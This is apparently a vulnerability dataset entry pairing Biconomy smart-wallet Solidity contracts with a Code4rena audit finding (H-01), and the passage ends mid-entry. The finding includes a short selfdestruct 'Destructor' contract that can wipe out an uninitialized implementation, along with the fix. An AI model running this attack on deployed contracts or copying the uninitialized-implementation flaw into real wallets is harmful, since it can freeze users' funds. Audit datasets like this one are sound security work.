[
    {
        "Code": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.12;\n\nimport \"./libs/LibAddress.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\nimport \"@openzeppelin/contracts-upgradeable/security/ReentrancyGuardUpgradeable.sol\";\nimport \"./BaseSmartAccount.sol\";\nimport \"./common/Singleton.sol\";\nimport \"./base/ModuleManager.sol\";\nimport \"./base/FallbackManager.sol\";\nimport \"./common/SignatureDecoder.sol\";\nimport \"./common/SecuredTokenTransfer.sol\";\nimport \"./interfaces/ISignatureValidator.sol\";\nimport \"./interfaces/IERC165.sol\";\nimport \"@openzeppelin/contracts/utils/cryptography/ECDSA.sol\";\n\ncontract SmartAccount is \n     Singleton,\n     BaseSmartAccount,\n     IERC165,\n     ModuleManager,\n     SignatureDecoder,\n     SecuredTokenTransfer,\n     ISignatureValidatorConstants,\n     FallbackManager,\n     Initializable,\n     ReentrancyGuardUpgradeable\n    {\n    using ECDSA for bytes32;\n    using LibAddress for address;\n\n    // Storage\n\n    // Version\n    string public constant VERSION = \"1.0.2\"; // using AA 0.3.0\n\n    // Domain Seperators\n    // keccak256(\n    //     \"EIP712Domain(uint256 chainId,address verifyingContract)\"\n    // );\n    bytes32 internal constant DOMAIN_SEPARATOR_TYPEHASH = 0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218;\n\n    // review? if rename wallet to account is must\n    // keccak256(\n    //     \"AccountTx(address to,uint256 value,bytes data,uint8 operation,uint256 targetTxGas,uint256 baseGas,uint256 gasPrice,address gasToken,address refundReceiver,uint256 nonce)\"\n    // );\n    bytes32 internal constant ACCOUNT_TX_TYPEHASH = 0xc2595443c361a1f264c73470b9410fd67ac953ebd1a3ae63a2f514f3f014cf07;\n\n    // Owner storage\n    address public owner;\n\n    // uint96 private _nonce; //changed to 2D nonce below\n    // @notice there is no _nonce \n    mapping(uint256 => uint256) public nonces;\n\n    // AA storage\n    // review\n    IEntryPoint private _entryPoint;\n\n    \n    // Events\n    // EOA + Version tracking\n    event ImplementationUpdated(address _scw, string version, address newImplementation);\n    event EntryPointChanged(address oldEntryPoint, address newEntryPoint);\n    event EOAChanged(address indexed _scw, address indexed _oldEOA, address indexed _newEOA);\n    event WalletHandlePayment(bytes32 txHash, uint256 payment);\n    // nice to have\n    // event SmartAccountInitialized(IEntryPoint indexed entryPoint, address indexed owner);\n\n    // modifiers\n    // onlyOwner\n    /**\n     * @notice Throws if the sender is not an the owner.\n     */\n    modifier onlyOwner {\n        require(msg.sender == owner, \"Smart Account:: Sender is not authorized\");\n        _;\n    }\n\n    // onlyOwner OR self\n    modifier mixedAuth {\n        require(msg.sender == owner || msg.sender == address(this),\"Only owner or self\");\n        _;\n   }\n\n   // only from EntryPoint\n   modifier onlyEntryPoint {\n        require(msg.sender == address(entryPoint()), \"wallet: not from EntryPoint\");\n        _; \n   }\n\n   function nonce() public view virtual override returns (uint256) {\n        return nonces[0];\n    }\n\n    function nonce(uint256 _batchId) public view virtual override returns (uint256) {\n        return nonces[_batchId];\n    }\n\n    function entryPoint() public view virtual override returns (IEntryPoint) {\n        return _entryPoint;\n    }\n\n    // @notice authorized modifier (onlySelf) is already inherited\n\n    // Setters\n\n    function setOwner(address _newOwner) external mixedAuth {\n        require(_newOwner != address(0), \"Smart Account:: new Signatory address cannot be zero\");\n        address oldOwner = owner;\n        owner = _newOwner;\n        emit EOAChanged(address(this), oldOwner, _newOwner);\n    }\n\n    /**\n     * @notice Updates the implementation of the base wallet\n     * @param _implementation New wallet implementation\n     */\n    function updateImplementation(address _implementation) external mixedAuth {\n        require(_implementation.isContract(), \"INVALID_IMPLEMENTATION\");\n        _setImplementation(_implementation);\n        // EOA + Version tracking\n        emit ImplementationUpdated(address(this), VERSION, _implementation);\n    }\n\n    function updateEntryPoint(address _newEntryPoint) external mixedAuth {\n        require(_newEntryPoint != address(0), \"Smart Account:: new entry point address cannot be zero\");\n        emit EntryPointChanged(address(_entryPoint), _newEntryPoint);\n        _entryPoint = IEntryPoint(payable(_newEntryPoint));\n    }\n\n    // Getters\n\n    function domainSeparator() public view returns (bytes32) {\n        return keccak256(abi.encode(DOMAIN_SEPARATOR_TYPEHASH, getChainId(), this));\n    }\n\n    /// @dev Returns the chain id used by this contract.\n    function getChainId() public view returns (uint256) {\n        uint256 id;\n        // solhint-disable-next-line no-inline-assembly\n        assembly {\n            id := chainid()\n        }\n        return id;\n    }\n\n    //@review getNonce specific to EntryPoint requirements\n    /**\n     * @dev returns a value from the nonces 2d mapping\n     * @param batchId : the key of the user's batch being queried\n     * @return nonce : the number of transaction made within said batch\n     */\n    function getNonce(uint256 batchId)\n    public view\n    returns (uint256) {\n        return nonces[batchId];\n    }\n\n\n    // init\n    // Initialize / Setup\n    // Used to setup\n    // i. owner ii. entry point address iii. handler\n    function init(address _owner, address _entryPointAddress, address _handler) public override initializer { \n        require(owner == address(0), \"Already initialized\");\n        require(address(_entryPoint) == address(0), \"Already initialized\");\n        require(_owner != address(0),\"Invalid owner\");\n        require(_entryPointAddress != address(0), \"Invalid Entrypoint\");\n        require(_handler != address(0), \"Invalid Entrypoint\");\n        owner = _owner;\n        _entryPoint =  IEntryPoint(payable(_entryPointAddress));\n        if (_handler != address(0)) internalSetFallbackHandler(_handler);\n        setupModules(address(0), bytes(\"\"));\n    }\n\n    /**\n     * @dev Returns the largest of two numbers.\n     */\n    function max(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a >= b ? a : b;\n    }\n\n    // Gnosis style transaction with optional repay in native tokens OR ERC20 \n    /// @dev Allows to execute a Safe transaction confirmed by required number of owners and then pays the account that submitted the transaction.\n    /// Note: The fees are always transferred, even if the user transaction fails.\n    /// @param _tx Wallet transaction \n    /// @param batchId batchId key for 2D nonces\n    /// @param refundInfo Required information for gas refunds\n    /// @param signatures Packed signature data ({bytes32 r}{bytes32 s}{uint8 v})\n    function execTransaction(\n        Transaction memory _tx,\n        uint256 batchId,\n        FeeRefund memory refundInfo,\n        bytes memory signatures\n    ) public payable virtual override returns (bool success) {\n        // initial gas = 21k + non_zero_bytes * 16 + zero_bytes * 4\n        //            ~= 21k + calldata.length * [1/3 * 16 + 2/3 * 4]\n        uint256 startGas = gasleft() + 21000 + msg.data.length * 8;\n        //console.log(\"init %s\", 21000 + msg.data.length * 8);\n        bytes32 txHash;\n        // Use scope here to limit variable lifetime and prevent `stack too deep` errors\n        {\n            bytes memory txHashData =\n                encodeTransactionData(\n                    // Transaction info\n                    _tx,\n                    // Payment info\n                    refundInfo,\n                    // Signature info\n                    nonces[batchId]\n                );\n            // Increase nonce and execute transaction.\n            // Default space aka batchId is 0\n            nonces[batchId]++;\n            txHash = keccak256(txHashData);\n            checkSignatures(txHash, txHashData, signatures);\n        }\n\n\n        // We require some gas to emit the events (at least 2500) after the execution and some to perform code until the execution (500)\n        // We also include the 1/64 in the check that is not send along with a call to counteract potential shortings because of EIP-150\n        require(gasleft() >= max((_tx.targetTxGas * 64) / 63,_tx.targetTxGas + 2500) + 500, \"BSA010\");\n        // Use scope here to limit variable lifetime and prevent `stack too deep` errors\n        {\n            // If the gasPrice is 0 we assume that nearly all available gas can be used (it is always more than targetTxGas)\n            // We only substract 2500 (compared to the 3000 before) to ensure that the amount passed is still higher than targetTxGas\n            success = execute(_tx.to, _tx.value, _tx.data, _tx.operation, refundInfo.gasPrice == 0 ? (gasleft() - 2500) : _tx.targetTxGas);\n            // If no targetTxGas and no gasPrice was set (e.g. both are 0), then the internal tx is required to be successful\n            // This makes it possible to use `estimateGas` without issues, as it searches for the minimum gas where the tx doesn't revert\n            require(success || _tx.targetTxGas != 0 || refundInfo.gasPrice != 0, \"BSA013\");\n            // We transfer the calculated tx costs to the tx.origin to avoid sending it to intermediate contracts that have made calls\n            uint256 payment = 0;\n            // uint256 extraGas;\n            if (refundInfo.gasPrice > 0) {\n                //console.log(\"sent %s\", startGas - gasleft());\n                // extraGas = gasleft();\n                payment = handlePayment(startGas - gasleft(), refundInfo.baseGas, refundInfo.gasPrice, refundInfo.tokenGasPriceFactor, refundInfo.gasToken, refundInfo.refundReceiver);\n                emit WalletHandlePayment(txHash, payment);\n            }\n            // extraGas = extraGas - gasleft();\n            //console.log(\"extra gas %s \", extraGas);\n        }\n    }\n\n    function handlePayment(\n        uint256 gasUsed,\n        uint256 baseGas,\n        uint256 gasPrice,\n        uint256 tokenGasPriceFactor,\n        address gasToken,\n        address payable refundReceiver\n    ) private nonReentrant returns (uint256 payment) {\n        // uint256 startGas = gasleft();\n        // solhint-disable-next-line avoid-tx-origin\n        address payable receiver = refundReceiver == address(0) ? payable(tx.origin) : refundReceiver;\n        if (gasToken == address(0)) {\n            // For ETH we will only adjust the gas price to not be higher than the actual used gas price\n            payment = (gasUsed + baseGas) * (gasPrice < tx.gasprice ? gasPrice : tx.gasprice);\n            (bool success,) = receiver.call{value: payment}(\"\");\n            require(success, \"BSA011\");\n        } else {\n            payment = (gasUsed + baseGas) * (gasPrice) / (tokenGasPriceFactor);\n            require(transferToken(gasToken, receiver, payment), \"BSA012\");\n        }\n        // uint256 requiredGas = startGas - gasleft();\n        //console.log(\"hp %s\", requiredGas);\n    }\n\n    function handlePaymentRevert(\n        uint256 gasUsed,\n        uint256 baseGas,\n        uint256 gasPrice,\n        uint256 tokenGasPriceFactor,\n        address gasToken,\n        address payable refundReceiver\n    ) external returns (uint256 payment) {\n        uint256 startGas = gasleft();\n        // solhint-disable-next-line avoid-tx-origin\n        address payable receiver = refundReceiver == address(0) ? payable(tx.origin) : refundReceiver;\n        if (gasToken == address(0)) {\n            // For ETH we will only adjust the gas price to not be higher than the actual used gas price\n            payment = (gasUsed + baseGas) * (gasPrice < tx.gasprice ? gasPrice : tx.gasprice);\n            (bool success,) = receiver.call{value: payment}(\"\");\n            require(success, \"BSA011\");\n        } else {\n            payment = (gasUsed + baseGas) * (gasPrice) / (tokenGasPriceFactor);\n            require(transferToken(gasToken, receiver, payment), \"BSA012\");\n        }\n        uint256 requiredGas = startGas - gasleft();\n        //console.log(\"hpr %s\", requiredGas);\n        // Convert response to string and return via error message\n        revert(string(abi.encodePacked(requiredGas)));\n    }\n\n    /**\n     * @dev Checks whether the signature provided is valid for the provided data, hash. Will revert otherwise.\n     * @param dataHash Hash of the data (could be either a message hash or transaction hash)\n     * @param signatures Signature data that should be verified. Can be ECDSA signature, contract signature (EIP-1271) or approved hash.\n     */\n    function checkSignatures(\n        bytes32 dataHash,\n        bytes memory data,\n        bytes memory signatures\n    ) public view virtual {\n        uint8 v;\n        bytes32 r;\n        bytes32 s;\n        uint256 i = 0;\n        address _signer;\n        (v, r, s) = signatureSplit(signatures, i);\n        //review\n        if(v == 0) {\n            // If v is 0 then it is a contract signature\n            // When handling contract signatures the address of the contract is encoded into r\n            _signer = address(uint160(uint256(r)));\n\n            // Check that signature data pointer (s) is not pointing inside the static part of the signatures bytes\n                // This check is not completely accurate, since it is possible that more signatures than the threshold are send.\n                // Here we only check that the pointer is not pointing inside the part that is being processed\n                require(uint256(s) >= uint256(1) * 65, \"BSA021\");\n\n                // Check that signature data pointer (s) is in bounds (points to the length of data -> 32 bytes)\n                require(uint256(s) + 32 <= signatures.length, \"BSA022\");\n\n                // Check if the contract signature is in bounds: start of data is s + 32 and end is start + signature length\n                uint256 contractSignatureLen;\n                // solhint-disable-next-line no-inline-assembly\n                assembly {\n                    contractSignatureLen := mload(add(add(signatures, s), 0x20))\n                }\n                require(uint256(s) + 32 + contractSignatureLen <= signatures.length, \"BSA023\");\n\n                // Check signature\n                bytes memory contractSignature;\n                // solhint-disable-next-line no-inline-assembly\n                assembly {\n                    // The signature data for contract signatures is appended to the concatenated signatures and the offset is stored in s\n                    contractSignature := add(add(signatures, s), 0x20)\n                }\n                require(ISignatureValidator(_signer).isValidSignature(data, contractSignature) == EIP1271_MAGIC_VALUE, \"BSA024\");\n        }\n        else if(v > 30) {\n            // If v > 30 then default va (27,28) has been adjusted for eth_sign flow\n            // To support eth_sign and similar we adjust v and hash the messageHash with the Ethereum message prefix before applying ecrecover\n            _signer = ecrecover(keccak256(abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", dataHash)), v - 4, r, s);\n            require(_signer == owner, \"INVALID_SIGNATURE\");\n        } else {\n            _signer = ecrecover(dataHash, v, r, s);\n            require(_signer == owner, \"INVALID_SIGNATURE\");\n        }\n    }\n\n    /// @dev Allows to estimate a transaction.\n    ///      This method is only meant for estimation purpose, therefore the call will always revert and encode the result in the revert data.\n    ///      Since the `estimateGas` function includes refunds, call this method to get an estimated of the costs that are deducted from the safe with `execTransaction`\n    /// @param to Destination address of Safe transaction.\n    /// @param value Ether value of transaction.\n    /// @param data Data payload of transaction.\n    /// @param operation Operation type of transaction.\n    /// @return Estimate without refunds and overhead fees (base transaction and payload data gas costs).\n    function requiredTxGas(\n        address to,\n        uint256 value,\n        bytes calldata data,\n        Enum.Operation operation\n    ) external returns (uint256) {\n        uint256 startGas = gasleft();\n        // We don't provide an error message here, as we use it to return the estimate\n        require(execute(to, value, data, operation, gasleft()));\n        uint256 requiredGas = startGas - gasleft();\n        // Convert response to string and return via error message\n        revert(string(abi.encodePacked(requiredGas)));\n    }\n\n    /// @dev Returns hash to be signed by owner.\n    /// @param to Destination address.\n    /// @param value Ether value.\n    /// @param data Data payload.\n    /// @param operation Operation type.\n    /// @param targetTxGas Fas that should be used for the safe transaction.\n    /// @param baseGas Gas costs for data used to trigger the safe transaction.\n    /// @param gasPrice Maximum gas price that should be used for this transaction.\n    /// @param gasToken Token address (or 0 if ETH) that is used for the payment.\n    /// @param refundReceiver Address of receiver of gas payment (or 0 if tx.origin).\n    /// @param _nonce Transaction nonce.\n    /// @return Transaction hash.\n    function getTransactionHash(\n        address to,\n        uint256 value,\n        bytes calldata data,\n        Enum.Operation operation,\n        uint256 targetTxGas,\n        uint256 baseGas,\n        uint256 gasPrice,\n        uint256 tokenGasPriceFactor,\n        address gasToken,\n        address payable refundReceiver,\n        uint256 _nonce\n    ) public view returns (bytes32) {\n        Transaction memory _tx = Transaction({\n            to: to,\n            value: value,\n            data: data,\n            operation: operation,\n            targetTxGas: targetTxGas\n        });\n        FeeRefund memory refundInfo = FeeRefund({\n            baseGas: baseGas,\n            gasPrice: gasPrice,\n            tokenGasPriceFactor: tokenGasPriceFactor,\n            gasToken: gasToken,\n            refundReceiver: refundReceiver\n        });\n        return keccak256(encodeTransactionData(_tx, refundInfo, _nonce));\n    }\n\n    /// @dev Returns the bytes that are hashed to be signed by owner.\n    /// @param _tx Wallet transaction \n    /// @param refundInfo Required information for gas refunds\n    /// @param _nonce Transaction nonce.\n    /// @return Transaction hash bytes.\n    function encodeTransactionData(\n        Transaction memory _tx,\n        FeeRefund memory refundInfo,\n        uint256 _nonce\n    ) public view returns (bytes memory) {\n        bytes32 safeTxHash =\n            keccak256(\n                abi.encode(\n                    ACCOUNT_TX_TYPEHASH,\n                    _tx.to,\n                    _tx.value,\n                    keccak256(_tx.data),\n                    _tx.operation,\n                    _tx.targetTxGas,\n                    refundInfo.baseGas,\n                    refundInfo.gasPrice,\n                    refundInfo.gasToken,\n                    refundInfo.refundReceiver,\n                    _nonce\n                )\n            );\n        return abi.encodePacked(bytes1(0x19), bytes1(0x01), domainSeparator(), safeTxHash);\n    }\n\n    // Extra Utils \n    function transfer(address payable dest, uint amount) external nonReentrant onlyOwner {\n        require(dest != address(0), \"this action will burn your funds\");\n        (bool success,) = dest.call{value:amount}(\"\");\n        require(success,\"transfer failed\");\n    }\n\n    function pullTokens(address token, address dest, uint256 amount) external onlyOwner {\n        IERC20 tokenContract = IERC20(token);\n        SafeERC20.safeTransfer(tokenContract, dest, amount);\n    }\n\n    function execute(address dest, uint value, bytes calldata func) external onlyOwner{\n        _requireFromEntryPointOrOwner();\n        _call(dest, value, func);\n    }\n\n    function executeBatch(address[] calldata dest, bytes[] calldata func) external onlyOwner{\n        _requireFromEntryPointOrOwner();\n        require(dest.length == func.length, \"wrong array lengths\");\n        for (uint i = 0; i < dest.length;) {\n            _call(dest[i], 0, func[i]);\n            unchecked {\n                ++i;\n            }\n        }\n    }\n\n    // AA implementation\n    function _call(address target, uint256 value, bytes memory data) internal {\n        (bool success, bytes memory result) = target.call{value : value}(data);\n        if (!success) {\n            assembly {\n                revert(add(result, 32), mload(result))\n            }\n        }\n    }\n    \n    //called by entryPoint, only after validateUserOp succeeded.\n    //@review\n    //Method is updated to instruct delegate call and emit regular events\n    function execFromEntryPoint(address dest, uint value, bytes calldata func, Enum.Operation operation, uint256 gasLimit) external onlyEntryPoint returns (bool success) {        \n        success = execute(dest, value, func, operation, gasLimit);\n        require(success, \"Userop Failed\");\n    }\n\n    function _requireFromEntryPointOrOwner() internal view {\n        require(msg.sender == address(entryPoint()) || msg.sender == owner, \"account: not Owner or EntryPoint\");\n    }\n\n    /// implement template method of BaseAccount\n    // @notice Nonce space is locked to 0 for AA transactions\n    // userOp could have batchId as well\n    function _validateAndUpdateNonce(UserOperation calldata userOp) internal override {\n        require(nonces[0]++ == userOp.nonce, \"account: invalid nonce\");\n    }\n\n    /// implement template method of BaseAccount\n    function _validateSignature(UserOperation calldata userOp, bytes32 userOpHash, address)\n    internal override virtual returns (uint256 deadline) {\n        bytes32 hash = userOpHash.toEthSignedMessageHash();\n        //ignore signature mismatch of from==ZERO_ADDRESS (for eth_callUserOp validation purposes)\n        // solhint-disable-next-line avoid-tx-origin\n        require(owner == hash.recover(userOp.signature) || tx.origin == address(0), \"account: wrong signature\");\n        return 0;\n    }\n\n    /**\n     * check current account deposit in the entryPoint\n     */\n    function getDeposit() public view returns (uint256) {\n        return entryPoint().balanceOf(address(this));\n    }\n\n    /**\n     * deposit more funds for this account in the entryPoint\n     */\n    function addDeposit() public payable {\n\n        (bool req,) = address(entryPoint()).call{value : msg.value}(\"\");\n        require(req);\n    }\n\n    /**\n     * withdraw value from the account's deposit\n     * @param withdrawAddress target to send to\n     * @param amount to withdraw\n     */\n    function withdrawDepositTo(address payable withdrawAddress, uint256 amount) public onlyOwner {\n        entryPoint().withdrawTo(withdrawAddress, amount);\n    }\n\n    /**\n     * @notice Query if a contract implements an interface\n     * @param interfaceId The interface identifier, as specified in ERC165\n     * @return `true` if the contract implements `_interfaceID`\n    */\n    function supportsInterface(bytes4 interfaceId) external view virtual override returns (bool) {\n        return interfaceId == type(IERC165).interfaceId; // 0x01ffc9a7\n    }\n\n    // solhint-disable-next-line no-empty-blocks\n    receive() external payable {}\n}\n\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.12;\n\n/**\n * @title Proxy // This is the user's wallet\n * @notice Basic proxy that delegates all calls to a fixed implementing contract.\n */\ncontract Proxy {\n\n    /* This is the keccak-256 hash of \"biconomy.scw.proxy.implementation\" subtracted by 1, and is validated in the constructor */\n    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x37722d148fb373b961a84120b6c8d209709b45377878a466db32bbc40d95af26;\n\n    event Received(uint indexed value, address indexed sender, bytes data);\n\n    constructor(address _implementation) {\n         assert(_IMPLEMENTATION_SLOT == bytes32(uint256(keccak256(\"biconomy.scw.proxy.implementation\")) - 1));\n         assembly {\n             sstore(_IMPLEMENTATION_SLOT,_implementation) \n         }\n    }\n\n    fallback() external payable {\n        address target;\n        // solhint-disable-next-line no-inline-assembly\n        assembly {\n            target := sload(_IMPLEMENTATION_SLOT)\n            calldatacopy(0, 0, calldatasize())\n            let result := delegatecall(gas(), target, 0, calldatasize(), 0, 0)\n            returndatacopy(0, 0, returndatasize())\n            switch result\n            case 0 {revert(0, returndatasize())}\n            default {return (0, returndatasize())}\n        }\n    }\n\n    receive() external payable {\n        emit Received(msg.value, msg.sender, \"\");\n    }\n\n}\n\n// SPDX-License-Identifier: GPL-3.0\npragma solidity 0.8.12;\n\n/* solhint-disable avoid-low-level-calls */\n/* solhint-disable no-inline-assembly */\n/* solhint-disable reason-string */\n\nimport \"@account-abstraction/contracts/interfaces/IAccount.sol\";\nimport \"@account-abstraction/contracts/interfaces/IEntryPoint.sol\";\nimport \"./common/Enum.sol\";\n\nstruct Transaction {\n        address to;\n        uint256 value;\n        bytes data;\n        Enum.Operation operation;\n        uint256 targetTxGas;\n    }\n\nstruct FeeRefund {\n        uint256 baseGas;\n        uint256 gasPrice; //gasPrice or tokenGasPrice\n        uint256 tokenGasPriceFactor;\n        address gasToken;\n        address payable refundReceiver;\n    }\n\n/**\n * Basic account implementation.\n * this contract provides the basic logic for implementing the IAccount interface  - validateUserOp\n * specific account implementation should inherit it and provide the account-specific logic\n */\nabstract contract BaseSmartAccount is IAccount {\n    using UserOperationLib for UserOperation;\n\n\n    /**\n     * return the account nonce.\n     * subclass should return a nonce value that is used both by _validateAndUpdateNonce, and by the external provider (to read the current nonce)\n     */\n    function nonce() public view virtual returns (uint256);\n\n     /**\n     * return the account nonce.\n     * subclass should return a nonce value that is used both by _validateAndUpdateNonce, and by the external provider (to read the current nonce)\n     */\n    function nonce(uint256 _batchId) public view virtual returns (uint256);\n\n    /**\n     * return the entryPoint used by this account.\n     * subclass should return the current entryPoint used by this account.\n     */\n    function entryPoint() public view virtual returns (IEntryPoint);\n\n    /**\n     * Validate user's signature and nonce.\n     * subclass doesn't need to override this method. Instead, it should override the specific internal validation methods.\n     */\n    // review virtual \n    function validateUserOp(UserOperation calldata userOp, bytes32 userOpHash, address aggregator, uint256 missingAccountFunds)\n    external override virtual returns (uint256 deadline) {\n        _requireFromEntryPoint();\n        deadline = _validateSignature(userOp, userOpHash, aggregator);\n        if (userOp.initCode.length == 0) {\n            _validateAndUpdateNonce(userOp);\n        }\n        _payPrefund(missingAccountFunds);\n    }\n\n    /**\n     * ensure the request comes from the known entrypoint.\n     */\n    function _requireFromEntryPoint() internal virtual view {\n        require(msg.sender == address(entryPoint()), \"account: not from EntryPoint\");\n    }\n\n    /**\n     * validate the signature is valid for this message.\n     * @param userOp validate the userOp.signature field\n     * @param userOpHash convenient field: the hash of the request, to check the signature against\n     *          (also hashes the entrypoint and chain-id)\n     * @param aggregator the current aggregator. can be ignored by accounts that don't use aggregators\n     * @return deadline the last block timestamp this operation is valid, or zero if it is valid indefinitely.\n     *      Note that the validation code cannot use block.timestamp (or block.number) directly.\n     */\n    // Review if we need to make view function\n    function _validateSignature(UserOperation calldata userOp, bytes32 userOpHash, address aggregator)\n    internal virtual returns (uint256 deadline);\n\n    /**\n     * validate the current nonce matches the UserOperation nonce.\n     * then it should update the account's state to prevent replay of this UserOperation.\n     * called only if initCode is empty (since \"nonce\" field is used as \"salt\" on account creation)\n     * @param userOp the op to validate.\n     */\n    function _validateAndUpdateNonce(UserOperation calldata userOp) internal virtual;\n\n    /**\n     * sends to the entrypoint (msg.sender) the missing funds for this transaction.\n     * subclass MAY override this method for better funds management\n     * (e.g. send to the entryPoint more than the minimum required, so that in future transactions\n     * it will not be required to send again)\n     * @param missingAccountFunds the minimum value this method should send the entrypoint.\n     *  this value MAY be zero, in case there is enough deposit, or the userOp has a paymaster.\n     */\n    function _payPrefund(uint256 missingAccountFunds) internal virtual {\n        if (missingAccountFunds != 0) {\n            (bool success,) = payable(msg.sender).call{value : missingAccountFunds, gas : type(uint256).max}(\"\");\n            (success);\n            //ignore failure (its EntryPoint's job to verify, not account.)\n        }\n    }\n    \n    function init(address _owner, address _entryPointAddress, address _handler) external virtual;\n\n    function execTransaction(\n        Transaction memory _tx,\n        uint256 batchId,\n        FeeRefund memory refundInfo,\n        bytes memory signatures) public payable virtual returns (bool success);\n}\n\n",
        "CodeNames": [
            "SmartAccount.sol",
            "Proxy.sol",
            "BaseSmartAccount.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-01",
                "Location": [
                    "//solidity\ncontract Destructor {\n    fallback() external {\n        selfdestruct(payable(0));\n    }\n}\n",
                    "typescript\nconst SmartWallet = await ethers.getContractFactory(\"SmartAccount\");\nconst baseImpl = await SmartWallet.deploy();\nawait baseImpl.deployed();\nconsole.log(\"base wallet impl deployed at: \", baseImpl.address);\n"
                ],
                "Type": " Destruction of the  SmartAccount  implementation",
                "Description": "*Submitted by V_B(https://github.com/code-423n4/2023-01-biconomy-findings/issues/496), also found by gogo(https://github.com/code-423n4/2023-01-biconomy-findings/issues/491), gogo(https://github.com/code-423n4/2023-01-biconomy-findings/issues/474), adriro(https://github.com/code-423n4/2023-01-biconomy-findings/issues/443), smit_rajput(https://github.com/code-423n4/2023-01-biconomy-findings/issues/357), Koolex(https://github.com/code-423n4/2023-01-biconomy-findings/issues/324), hihen(https://github.com/code-423n4/2023-01-biconomy-findings/issues/229), spacelord47(https://github.com/code-423n4/2023-01-biconomy-findings/issues/201), 0xdeadbeef0x(https://github.com/code-423n4/2023-01-biconomy-findings/issues/174), Matin(https://github.com/code-423n4/2023-01-biconomy-findings/issues/169), chaduke(https://github.com/code-423n4/2023-01-biconomy-findings/issues/155), jonatascm(https://github.com/code-423n4/2023-01-biconomy-findings/issues/98), ro(https://github.com/code-423n4/2023-01-biconomy-findings/issues/60), taek(https://github.com/code-423n4/2023-01-biconomy-findings/issues/41), HE1M(https://github.com/code-423n4/2023-01-biconomy-findings/issues/39), and kankodu(https://github.com/code-423n4/2023-01-biconomy-findings/issues/14)*\n\ncontracts/smart-contract-wallet/SmartAccount.sol#L166(https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L166)<br\ncontracts/smart-contract-wallet/SmartAccount.sol#L192(https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L192)<br\ncontracts/smart-contract-wallet/SmartAccount.sol#L229(https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L229)<br\ncontracts/smart-contract-wallet/base/Executor.sol#L23(https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/base/Executor.sol#L23)\n\nIf the SmartAccount implementation contract is not initialized, it can be destroyed using the following attack scenario:\n\n*   Initialize the SmartAccount implementation contract using the init function.\n*   Execute a transaction that contains a single delegatecall to a contract that executes the selfdestruct opcode on any incoming call, such as:\n\nsolidity\ncontract Destructor {\n    fallback() external {\n        selfdestruct(payable(0));\n    }\n}\n\n\nThe destruction of the implementation contract would result in the freezing of all functionality of the wallets that point to such an implementation. It would also be impossible to change the implementation address, as the Singleton functionality and the entire contract would be destroyed, leaving only the functionality from the Proxy contract accessible.\n\nIn the deploy script there is the following logic:\n\ntypescript\nconst SmartWallet = await ethers.getContractFactory(\"SmartAccount\");\nconst baseImpl = await SmartWallet.deploy();\nawait baseImpl.deployed();\nconsole.log(\"base wallet impl deployed at: \", baseImpl.address);\n\n\nSo, in the deploy script there is no enforce that the SmartAccount contract implementation was initialized.\n\nThe same situation in scw-contracts/scripts/wallet-factory.deploy.ts script.\n\nPlease note, that in case only the possibility of initialization of the SmartAccount implementation will be banned it will be possible to use this attack. This is so because in such a case owner variable will be equal to zero and it will be easy to pass a check inside of checkSignatures function using the fact that for incorrect input parameters ecrecover returns a zero address.\n\n\nComplete freezing of all functionality of all wallets (including complete funds freezing).\n\n",
                "Repair": "\nAdd to the deploy script initialization of the SmartAccount implementation, or add to the SmartAccount contract the following constructor that will prevent implementation contract from the initialization:\n\nsolidity\n// Constructor ensures that this implementation contract can not be initialized\nconstructor() public {\n    owner = address(1);\n}\n\n\ngzeon (judge) commented(https://github.com/code-423n4/2023-01-biconomy-findings/issues/496#issuecomment-1384930216):\n  #14(https://github.com/code-423n4/2023-01-biconomy-findings/issues/14) also notes that if owner is left to address(0) some validation can be bypassed.\n\nlivingrockrises (Biconomy) confirmed(https://github.com/code-423n4/2023-01-biconomy-findings/issues/496#issuecomment-1404324137)\n\n\n\n*\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.12;\n\nimport \"./libs/LibAddress.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\nimport \"@openzeppelin/contracts-upgradeable/security/ReentrancyGuardUpgradeable.sol\";\nimport \"./BaseSmartAccount.sol\";\nimport \"./common/Singleton.sol\";\nimport \"./base/ModuleManager.sol\";\nimport \"./base/FallbackManager.sol\";\nimport \"./common/SignatureDecoder.sol\";\nimport \"./common/SecuredTokenTransfer.sol\";\nimport \"./interfaces/ISignatureValidator.sol\";\nimport \"./interfaces/IERC165.sol\";\nimport \"@openzeppelin/contracts/utils/cryptography/ECDSA.sol\";\n\ncontract SmartAccount is \n     Singleton,\n     BaseSmartAccount,\n     IERC165,\n     ModuleManager,\n     SignatureDecoder,\n     SecuredTokenTransfer,\n     ISignatureValidatorConstants,\n     FallbackManager,\n     Initializable,\n     ReentrancyGuardUpgradeable\n    {\n    using ECDSA for bytes32;\n    using LibAddress for address;\n\n    // Storage\n\n    // Version\n    string public constant VERSION = \"1.0.2\"; // using AA 0.3.0\n\n    // Domain Seperators\n    // keccak256(\n    //     \"EIP712Domain(uint256 chainId,address verifyingContract)\"\n    // );\n    bytes32 internal constant DOMAIN_SEPARATOR_TYPEHASH = 0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218;\n\n    // review? if rename wallet to account is must\n    // keccak256(\n    //     \"AccountTx(address to,uint256 value,bytes data,uint8 operation,uint256 targetTxGas,uint256 